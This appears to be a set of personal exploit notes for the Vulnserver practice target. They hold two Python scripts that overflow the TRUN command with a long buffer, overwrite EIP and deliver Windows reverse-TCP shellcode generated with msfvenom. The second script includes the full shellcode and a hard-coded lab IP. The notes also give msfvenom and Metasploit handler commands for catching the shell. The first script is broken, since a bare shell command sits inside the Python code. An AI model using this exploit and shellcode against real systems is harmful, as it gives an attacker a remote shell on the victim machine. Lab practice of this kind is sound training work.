#!/usr/bin/python\xee"

import socket

overflow = "TRUN /.:/"

#number at the end is offset found at https://wiremask.eu/tools/buffer-overflow-pattern-generator/
overflow += "A" * 2003

#uncomment this line to find eip
#buf += "BBBB"

#PROGRAM EIP GOES HERE 
eip = "\xA0\x12\x50\x62"

nop = "\x90" * 10

#place shell code here 
#payload 
msfvenom -p windows/shell/reverse_tcp lhost=<YOUR_IP_ADDRESS> lport=<LPORT> -b "\x00" -f python

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("TARGET_IP_ADDRESS", <TARGET_PORT>))

print s.recv(1024)

s.send(overflow + eip + nop + buf)

print s.recv(1024)

s.close()

https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b






>>msfconsole
    use multi/handler
    set paylaod (same payload in msfvenom)
    set lport (port inpayload)
    set lhost (0.0.0.0)
auditpol /get /catagory:*
auditpol /get /catagory:* | findstr /i "success failure"

-----------------------------------------------------------------------------------------------

#!/usr/bin/python
import socket
buffer = "TRUN /.:/" #2002 vs 2003 based on a space after the /.:/
#Buffer Size
buffer += "A" * 2003
#EIP Variable
eip = "\xA0\x12\x50\x62"
#NOP Statement
nop = "\x90" * 10
#msfvenom -p windows/shell/reverse_tcp lhost=<LinOps> lport=4444 -b "\x00" -f python
buf =  b""
buf += b"\xba\x90\x38\xaf\xdf\xd9\xe8\xd9\x74\x24\xf4\x58"
buf += b"\x29\xc9\xb1\x59\x31\x50\x14\x03\x50\x14\x83\xc0"
buf += b"\x04\x72\xcd\x53\x37\xfd\x2e\xac\xc8\x61\xa6\x49"
buf += b"\xf9\xb3\xdc\x1a\xa8\x03\x96\x4f\x41\xe8\xfa\x7b"
buf += b"\xd2\x9c\xd2\xb2\x1b\x6f\x94\xff\xc5\x5e\x1a\x53"
buf += b"\x35\xc1\xe6\xae\x6a\x21\xd6\x60\x7f\x20\x1f\x37"
buf += b"\xf5\xcd\xcd\x43\xa7\x01\x79\x11\x74\x20\xad\x1d"
buf += b"\xc4\x5a\x1a\xa7\x05\xee\xe8\xa6\x55\x5e\x7a\xf0"
buf += b"\x75\xd5\x34\x19\x77\x3a\x41\xd0\x03\x80\x7b\x1c"
buf += b"\xa2\x73\x4f\x69\x34\x55\x81\xad\x9b\x98\x2d\x20"
buf += b"\xe5\xdd\x8a\xdb\x90\x15\xe9\x66\xa3\xee\x93\xbc"
buf += b"\x26\xf0\x34\x36\x90\xd4\xc5\x9b\x47\x9f\xca\x50"
buf += b"\x03\xc7\xce\x67\xc0\x7c\xea\xec\xe7\x52\x7a\xb6"
buf += b"\xc3\x76\x26\x6c\x6d\x2f\x82\xc3\x92\x2f\x6a\xbb"
buf += b"\x36\x24\x99\xaa\x47\xc5\x61\xd3\x15\x51\xad\x1e"
buf += b"\xa6\xa1\xb9\x29\xd5\x93\x66\x82\x71\x9f\xef\x0c"
buf += b"\x85\x96\xf8\xae\x59\x10\x68\x51\x5a\x60\xa0\x96"
buf += b"\x0e\x30\xda\x3f\x2f\xdb\x1a\xbf\xfa\x71\x11\x57"
buf += b"\x0f\xb7\x3a\xf7\x67\xb5\x44\xe6\x2b\x30\xa2\x58"
buf += b"\x84\x12\x7b\x19\x74\xd2\x2b\xf1\x9e\xdd\x14\xe1"
buf += b"\xa0\x34\x3d\x88\x4e\xe0\x15\x25\xf6\xa9\xee\xd4"
buf += b"\xf7\x64\x8b\xd7\x7c\x8c\x6b\x99\x74\xe5\x7f\xce"
buf += b"\xe2\x05\x80\x0f\x87\x05\xea\x0b\x01\x52\x82\x11"
buf += b"\x74\x94\x0d\xe9\x53\xa7\x4a\x15\x22\x91\x21\x20"
buf += b"\xb0\x9d\x5d\x4d\x54\x1d\x9e\x1b\x3e\x1d\xf6\xfb"
buf += b"\x1a\x4e\xe3\x03\xb7\xe3\xb8\x91\x38\x55\x6c\x31"
buf += b"\x51\x5b\x4b\x75\xfe\xa4\xbe\x05\xf9\x5a\x3c\x22"
buf += b"\xa2\x32\xbe\x72\x52\xc2\xd4\x72\x02\xaa\x23\x5c"
buf += b"\xad\x1a\xcb\x77\xe6\x32\x46\x16\x44\xa3\x57\x33"
buf += b"\x08\x7d\x57\xb0\x91\x8e\x22\xb9\x26\x6f\xd3\xd3"
buf += b"\x42\x70\xd3\xdb\x74\x4d\x05\xe2\x02\x90\x95\x51"
buf += b"\x1c\xa7\xb8\xf0\xb7\xc7\xef\x03\x92"
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create the IPv4 socket, TCP Protocol
#Target
s.connect(("192.168.28.179", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response
s.send(buffer + eip + nop + buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #Close the socket
